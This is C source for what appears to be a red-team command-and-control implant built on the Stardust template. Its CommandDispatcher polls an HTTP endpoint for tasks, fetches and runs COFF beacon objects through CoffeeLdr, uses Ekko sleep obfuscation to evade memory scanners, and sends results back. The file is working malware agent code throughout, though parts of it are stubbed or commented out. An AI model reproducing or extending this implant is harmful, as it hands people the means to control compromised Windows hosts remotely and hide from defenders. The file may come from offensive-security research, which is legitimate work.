#include <CommandDispatcher.h>

FUNC int custom_isspace(char c) {
    // Check if the character is one of the standard whitespace characters
    if (c == ' ' || c == '\t' || c == '\n' || c == '\v' || c == '\f' || c == '\r') {
        return 1; // It's a whitespace character
    }
    return 0; // It's not a whitespace character
}

FUNC long custom_strtol(const char *str, char **endptr, int base) {
    const char *p = str;
    long result = 0;
    int negative = 0;

    // Skip leading whitespace
    while (custom_isspace(*p)) {
        p++;
    }

    // Check for optional sign
    if (*p == '-') {
        negative = 1;
        p++;
    } else if (*p == '+') {
        p++;
    }

    // Check for base prefix (0x for hex, 0 for octal)
    if (base == 0) {
        if (*p == '0') {
            if (*(p + 1) == 'x' || *(p + 1) == 'X') {
                base = 16;
                p += 2;
            } else {
                base = 8;
                p++;
            }
        } else {
            base = 10;
        }
    } else if (base == 16 && *p == '0' && (*(p + 1) == 'x' || *(p + 1) == 'X')) {
        p += 2;
    }

    // Convert the string to a long integer
    while (*p) {
        int digit;
        if (*p >= '0' && *p <= '9') {
            digit = *p - '0';
        } else if (*p >= 'a' && *p <= 'z') {
            digit = *p - 'a' + 10;
        } else if (*p >= 'A' && *p <= 'Z') {
            digit = *p - 'A' + 10;
        } else {
            break; // Non-numeric character found
        }

        if (digit >= base) {
            break; // Digit is invalid for the current base
        }

        // Check for overflow
        if (result > (LONG_MAX - digit) / base) {
            result = negative ? LONG_MIN : LONG_MAX;
            if (endptr) {
                *endptr = (char *) p;
            }
            return result;
        }

        result = result * base + digit;
        p++;
    }

    // Apply the sign
    if (negative) {
        result = -result;
    }

    // Set endptr to the first invalid character if provided
    if (endptr) {
        *endptr = (char *) p;
    }

    return result;
}

FUNC unsigned char *unhexlify(unsigned char *value, int *outlen) {
    STARDUST_INSTANCE

    unsigned char *retval = NULL;
    char byteval[3] = {0};
    unsigned int counter = 0;
    int counter2 = 0;
    char character = 0;
    if (value == NULL) {
        return NULL;
    }
    if (StringLengthA((char *) value) % 2 != 0) {
        goto errcase;
    }

    retval = Instance()->Win32.RtlAllocateHeap(Instance()->Heap, HEAP_ZERO_MEMORY, StringLengthA((char *) value) + 1);
    if (retval == NULL) {
        goto errcase;
    }

    counter2 = 0;
    for (counter = 0; counter < StringLengthA((char *) value); counter += 2) {
        MmCopy(byteval, value + counter, 2);
        character = (char) custom_strtol(byteval, NULL, 16);
        MmCopy(retval + counter2, &character, 1);
        counter2++;
    }
    *outlen = counter2;

errcase:
    return retval;
}

FUNC void CommandDispatcher() {
    STARDUST_INSTANCE

    // Fetch the task
    BUFFER task = SendRequest(L"http://localhost:8000/agent", L"GET", NULL);

    if (task.Length > 0) {
        BOOL ShouldSendData = FALSE;
        UINT32 Len = 0;
        PCHAR Id = Instance()->CurrentTaskID = ParserGetTaskID(&task); // Get task ID
        INT TaskType = ParserGetInt32(&task); // Get task type

        PCHAR data = NULL;

        if (TaskType == TASK_COFF) // TaskType 1: File-related task
        {
            PCHAR FileId = (PVOID)ParserGetBytes(&task, &Len); // Get File ID

            // Fetch the file using the File ID and Task ID
            BUFFER File = FileFetch(FileId, Id);

            Instance()->Win32.printf("%d", File.Length);

            SIZE_T ArgsLen = 0;
            PCHAR CoffArgs = NULL;
            PCHAR Unhexlified = NULL;

            // if (task.Length > 0) {
            //     // Get argument length
            //     // Instance()->Win32.printf("%d", task.Length);
            //     CoffArgs = (PVOID)ParserGetBytes(&task, &Len);
            //     Unhexlified = unhexlify(CoffArgs, (PVOID) &ArgsLen);
            // }

            // // PUCHAR args = "0900000003000000433a000000";
            // CoffeeLdr("go", File.Buffer, Unhexlified, ArgsLen);
            // CoffeeLdr("go", File.Buffer, NULL, 0);
            CoffeeLdr("go", "BAAA", NULL, 0);


            // Get the output data from the operation
            data = BeaconGetOutputData(0);
            ShouldSendData = TRUE;
        } else if (TaskType == TASK_SLEEP) {
            INT Res = ParserGetInt32(&task); // Get sleep duration
            EkkoEx(Res, SLEEPOBF_BYPASS); // Perform sleep with obfuscation bypass
            Response(Id, NULL, FALSE, L"http://localhost:8000/result");
        } else if (TaskType == TASK_EXIT) {
            return; // Exit the loop
        }

        if (ShouldSendData) {
            if (!data)
                Response(Id, NULL, TRUE, L"http://localhost:8000/result");
            else
                Response(Id, data, FALSE, L"http://localhost:8000/result");
        }
    }

    // Sleep for 1 second before fetching the next command
    EkkoEx(1000, SLEEPOBF_BYPASS);
    CommandDispatcher();
}
